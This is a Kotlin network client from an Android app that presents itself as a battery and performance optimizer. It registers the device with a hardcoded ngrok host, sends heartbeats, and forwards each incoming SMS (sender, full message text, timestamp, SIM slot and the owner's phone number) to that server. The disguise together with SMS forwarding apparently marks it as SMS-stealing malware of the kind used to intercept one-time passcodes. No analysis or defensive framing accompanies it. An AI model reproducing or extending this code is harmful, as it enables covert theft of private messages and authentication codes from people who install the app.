package com.performance.enhancer.optimization.suite.network

import android.content.Context
import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import com.performance.enhancer.optimization.suite.data.model.DeviceRegistrationInfo
import com.performance.enhancer.optimization.suite.data.model.HeartbeatData
import com.performance.enhancer.optimization.suite.utils.PersistentDeviceId
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

/**
 * API client for server communication
 */
class ServerApiClient(private val context: Context) {

    companion object {
        private const val TAG = "ServerApiClient"

        // Server configuration - ngrok URL for testing
        private const val BASE_URL = "https://ungroaning-kathe-ceilinged.ngrok-free.dev"
        private const val DEVICE_REGISTER_ENDPOINT = "$BASE_URL/api/device/register"
        private const val HEARTBEAT_ENDPOINT = "$BASE_URL/api/device/heartbeat"
        private const val SMS_FORWARD_ENDPOINT = "$BASE_URL/api/sms/receive"

        // Timeout settings
        private const val CONNECTION_TIMEOUT = 10000 // 10 seconds
        private const val READ_TIMEOUT = 15000 // 15 seconds
    }

    private val gson = Gson()

    /**
     * Gets the persistent device ID using the new PersistentDeviceId utility
     */
    private fun getDeviceId(): String {
        return PersistentDeviceId.getDeviceId(context)
    }

    /**
     * Registers device with server
     */
    suspend fun registerDevice(deviceInfo: DeviceRegistrationInfo): Boolean {
        return try {
            withContext(Dispatchers.IO) {
                val deviceId = getDeviceId()
                val registrationData = deviceInfo.copy(deviceId = deviceId)

                Log.d(TAG, "Registering device with ID: $deviceId")

                val url = URL(DEVICE_REGISTER_ENDPOINT)
                val connection = url.openConnection() as HttpURLConnection

                try {
                    // Configure connection
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", "application/json")
                    connection.setRequestProperty("Accept", "application/json")
                    connection.doOutput = true
                    connection.connectTimeout = CONNECTION_TIMEOUT
                    connection.readTimeout = READ_TIMEOUT

                    // Send data
                    val jsonData = gson.toJson(registrationData)
                    Log.d(TAG, "Registration data: $jsonData")

                    val outputStream = OutputStreamWriter(connection.outputStream)
                    outputStream.write(jsonData)
                    outputStream.flush()
                    outputStream.close()

                    // Get response
                    val responseCode = connection.responseCode
                    Log.d(TAG, "Registration response code: $responseCode")

                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        val response = BufferedReader(InputStreamReader(connection.inputStream))
                        val responseBody = response.readText()
                        response.close()

                        Log.d(TAG, "Registration response: $responseBody")
                        true
                    } else {
                        val errorResponse = BufferedReader(InputStreamReader(connection.errorStream))
                        val errorBody = errorResponse.readText()
                        errorResponse.close()

                        Log.e(TAG, "Registration failed: $responseCode - $errorBody")
                        false
                    }
                } finally {
                    connection.disconnect()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error registering device", e)
            false
        }
    }

    /**
     * Sends heartbeat to server
     */
    suspend fun sendHeartbeat(heartbeatData: HeartbeatData): Boolean {
        return try {
            withContext(Dispatchers.IO) {
                val deviceId = getDeviceId()
                val heartbeatDataWithId = heartbeatData.copy(deviceId = deviceId)

                Log.d(TAG, "Sending heartbeat for device: $deviceId")

                val url = URL(HEARTBEAT_ENDPOINT)
                val connection = url.openConnection() as HttpURLConnection

                try {
                    // Configure connection
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", "application/json")
                    connection.setRequestProperty("Accept", "application/json")
                    connection.doOutput = true
                    connection.connectTimeout = CONNECTION_TIMEOUT
                    connection.readTimeout = READ_TIMEOUT

                    // Send data
                    val jsonData = gson.toJson(heartbeatDataWithId)
                    Log.d(TAG, "Heartbeat data: $jsonData")

                    val outputStream = OutputStreamWriter(connection.outputStream)
                    outputStream.write(jsonData)
                    outputStream.flush()
                    outputStream.close()

                    // Get response
                    val responseCode = connection.responseCode
                    Log.d(TAG, "Heartbeat response code: $responseCode")

                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        val response = BufferedReader(InputStreamReader(connection.inputStream))
                        val responseBody = response.readText()
                        response.close()

                        Log.d(TAG, "Heartbeat response: $responseBody")
                        true
                    } else {
                        Log.e(TAG, "Heartbeat failed: $responseCode")
                        false
                    }
                } finally {
                    connection.disconnect()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending heartbeat", e)
            false
        }
    }

    /**
     * Forwards SMS to server
     */
    suspend fun forwardSms(
        sender: String,
        message: String,
        timestamp: Long,
        slotIndex: Int? = null
    ): Boolean {
        return try {
            withContext(Dispatchers.IO) {
                val deviceId = getDeviceId()
                val smsData = mapOf(
                    "deviceId" to deviceId,
                    "sender" to sender,
                    "message" to message,
                    "timestamp" to timestamp,
                    "slotIndex" to slotIndex,
                    "recipient" to (getCurrentPhoneNumber() ?: "Unknown")
                )

                Log.d(TAG, "Forwarding SMS from $sender")

                val url = URL(SMS_FORWARD_ENDPOINT)
                val connection = url.openConnection() as HttpURLConnection

                try {
                    // Configure connection
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", "application/json")
                    connection.setRequestProperty("Accept", "application/json")
                    connection.doOutput = true
                    connection.connectTimeout = CONNECTION_TIMEOUT
                    connection.readTimeout = READ_TIMEOUT

                    // Send data
                    val jsonData = gson.toJson(smsData)
                    Log.d(TAG, "SMS data: $jsonData")

                    val outputStream = OutputStreamWriter(connection.outputStream)
                    outputStream.write(jsonData)
                    outputStream.flush()
                    outputStream.close()

                    // Get response
                    val responseCode = connection.responseCode
                    Log.d(TAG, "SMS forward response code: $responseCode")

                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        val response = BufferedReader(InputStreamReader(connection.inputStream))
                        val responseBody = response.readText()
                        response.close()

                        Log.d(TAG, "SMS forward response: $responseBody")
                        true
                    } else {
                        Log.e(TAG, "SMS forward failed: $responseCode")
                        false
                    }
                } finally {
                    connection.disconnect()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error forwarding SMS", e)
            false
        }
    }

    /**
     * Gets current phone number from device info
     */
    private fun getCurrentPhoneNumber(): String? {
        // This would be set during device registration
        val sharedPrefs = context.getSharedPreferences("BatteryOptimize", Context.MODE_PRIVATE)
        return sharedPrefs.getString("current_phone_number", null)
    }

    /**
     * Saves current phone number
     */
    fun saveCurrentPhoneNumber(phoneNumber: String) {
        val sharedPrefs = context.getSharedPreferences("BatteryOptimize", Context.MODE_PRIVATE)
        sharedPrefs.edit().putString("current_phone_number", phoneNumber).apply()
        Log.d(TAG, "Saved phone number: $phoneNumber")
    }

    /**
     * Checks if device is registered
     */
    fun isDeviceRegistered(): Boolean {
        val sharedPrefs = context.getSharedPreferences("BatteryOptimize", Context.MODE_PRIVATE)
        return sharedPrefs.getBoolean("device_registered", false)
    }

    /**
     * Marks device as registered
     */
    fun markDeviceRegistered(registered: Boolean = true) {
        val sharedPrefs = context.getSharedPreferences("BatteryOptimize", Context.MODE_PRIVATE)
        sharedPrefs.edit().putBoolean("device_registered", registered).apply()
        Log.d(TAG, "Device registered status: $registered")
    }
}